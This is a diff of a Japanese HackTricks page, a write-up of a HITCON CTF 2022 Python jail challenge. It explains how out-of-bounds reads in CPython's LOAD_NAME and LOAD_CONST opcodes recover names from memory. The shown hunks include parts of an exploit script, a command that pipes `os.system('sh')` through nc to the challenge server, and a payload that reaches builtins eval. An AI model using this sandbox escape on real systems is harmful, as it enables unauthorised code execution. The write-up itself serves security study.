@@ -1,43 +1,41 @@
-# LOAD\_NAME / LOAD\_CONSTオペコード OOBリード
+# LOAD_NAME / LOAD_CONST opcode OOB Read
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricks をサポートする他の方法:
+
+* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
+* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。
 
 </details>
 
-**この情報は** [**この解説記事**](https://blog.splitline.tw/hitcon-ctf-2022/) **から取得されました。**
+**この情報は** [**この解説**](https://blog.splitline.tw/hitcon-ctf-2022/) **から取得されました。**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-LOAD\_NAME / LOAD\_CONSTオペコードのOOBリード機能を使用して、メモリ内のいくつかのシンボルを取得することができます。つまり、`(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、必要なシンボル（関数名など）を取得できます。
+LOAD_NAME / LOAD_CONSTオペコードのOOBリード機能を使用して、メモリ内のシンボルを取得できます。つまり、`(a, b, c, ... 数百のシンボル ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、必要なシンボル（関数名など）を取得できます。
 
 その後、エクスプロイトを作成します。
 
 ### 概要 <a href="#overview-1" id="overview-1"></a>
 
-ソースコードは非常に短く、わずか4行しかありません！
+ソースコードは非常に短く、わずか4行しか含まれていません！
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-任意のPythonコードを入力することができ、それは[Pythonコードオブジェクト](https://docs.python.org/3/c-api/code.html)にコンパイルされます。ただし、そのコードオブジェクトの`co_consts`と`co_names`は、そのコードオブジェクトを評価する前に空のタプルに置き換えられます。
-
-したがって、定数（例：数値、文字列など）または名前（例：変数、関数）を含むすべての式は、最終的にセグメンテーションフォールトを引き起こす可能性があります。
-
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-セグメンテーションフォールトはどのように発生するのでしょうか？
+セグメンテーション違反はどのように発生しますか？
 
-簡単な例から始めましょう。`[a, b, c]`は、次のバイトコードにコンパイルされる可能性があります。
+単純な例から始めましょう。 `[a, b, c]` は以下のバイトコードにコンパイルされる可能性があります。
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -45,11 +43,11 @@ print(eval(code, {'__builtins__': {}}))1234
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-しかし、`co_names`が空のタプルになった場合はどうなるでしょうか？`LOAD_NAME 2`オペコードは実行され、元々のメモリアドレスから値を読み取ろうとします。はい、これは範囲外の読み取りの「機能」です。
+しかし、`co_names` が空のタプルになった場合はどうなるでしょうか？ `LOAD_NAME 2` オペコードはまだ実行され、元々のメモリアドレスから値を読み取ろうとします。はい、これはアウト・オブ・バウンド・リードの「機能」です。
 
-解決策の核心コンセプトはシンプルです。CPythonの一部のオペコード、例えば`LOAD_NAME`と`LOAD_CONST`は、OOB読み取りの脆弱性があります。
+解決策のためのコアコンセプトはシンプルです。CPythonのいくつかのオペコード、例えば `LOAD_NAME` や `LOAD_CONST` は、OOBリードに脆弱です。
 
-これらのオペコードは、`consts`または`names`タプル（`co_consts`と`co_names`という名前で内部的に呼ばれる）からインデックス`oparg`のオブジェクトを取得します。CPythonが`LOAD_CONST`オペコードを処理する際に行うことを以下の短いスニペットで確認できます。
+これらは、`consts` または `names` タプルからインデックス `oparg` のオブジェクトを取得します（これが `co_consts` と `co_names` が内部的に呼ばれるものです）。CPythonが `LOAD_CONST` オペコードを処理する際に何を行うかを確認するために、次の短いスニペットを参照できます。
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -59,21 +57,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-この方法では、OOB（Out-of-Bounds）機能を使用して、任意のメモリオフセットから「name」を取得することができます。どの名前を持っているか、そしてオフセットがどれであるかを確認するために、単に`LOAD_NAME 0`、`LOAD_NAME 1`... `LOAD_NAME 99`...と試してみてください。そして、おそらくoparg > 700のあたりで何かを見つけることができるでしょう。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、より簡単ではないと思います。
+### 攻撃手法の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-### Exploitの生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+これにより、OOB機能を使用して任意のメモリオフセットから「name」を取得できます。その名前とオフセットを確認するには、単に `LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... と試行し続けます。そして、おそらく oparg > 700 で何かを見つけることができるでしょう。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、それがより簡単になるとは思いませんか？
 
-名前/定数の有用なオフセットを取得したら、そのオフセットから名前/定数を取得して使用する方法はどうすればいいのでしょうか？以下のトリックを使ってみましょう：\
-オフセット5（`LOAD_NAME 5`）から`__getattribute__`の名前を取得できると仮定し、`co_names=()`で次の手順を実行します：
+取得したこれらの名前/定数の有用なオフセットを取得したら、そのオフセットから名前/定数を取得して使用するにはどうすればよいのでしょうか？ 以下はそのトリックです：\
+`co_names=()` でオフセット5（`LOAD_NAME 5`）から `__getattribute__` 名を取得できると仮定して、次の手順を実行します：
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> 注意：`__getattribute__`という名前である必要はありません。短い名前や奇妙な名前でも構いません。
+> `__getattribute__`という名前を付ける必要はなく、より短い名前やより奇妙な名前を付けることもできます
 
-その理由は、バイトコードを表示するだけで理解できます：
+そのバイトコードを表示するだけで、その理由が理解できます：
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -90,9 +88,9 @@ FAST_DISPATCH();
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-`LOAD_ATTR`は`co_names`からも名前を取得します。Pythonは同じ名前の場合、同じオフセットから名前を読み込みますので、2番目の`__getattribute__`はまだオフセット5から読み込まれます。この特徴を利用すると、名前が近くのメモリにある限り、任意の名前を使用することができます。
+`LOAD_ATTR`も`co_names`から名前を取得します。Pythonは名前が同じ場合、同じオフセットから名前を読み込みます。そのため、2番目の`__getattribute__`もオフセット5から読み込まれます。この特性を利用すると、メモリの近くに名前があれば任意の名前を使用できます。
 
-数値の生成は簡単です:
+数値を生成するのは簡単です:
 
 * 0: not \[\[]]
 * 1: not \[]
@@ -101,7 +99,7 @@ FAST_DISPATCH();
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-長さ制限のため、定数は使用していません。
+長さ制限のため、constsは使用していません。
 
 まず、名前のオフセットを見つけるためのスクリプトを以下に示します。
 ```python
@@ -215,7 +213,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-基本的には、`__dir__` メソッドから取得した文字列に対して、以下のことを行います。
+それは基本的に、`__dir__` メソッドから取得した文字列に対して、以下のことを行います：
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -230,12 +228,14 @@ builtins['eval'](builtins['input']())
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**最新バージョンのPEASSにアクセスしたいですか**、または**HackTricksをPDFでダウンロードしたいですか**？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを！
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう！
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングのトリックを共有する**ために、[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。
+HackTricksをサポートする他の方法：
+
+* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
+* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。
 
 </details>
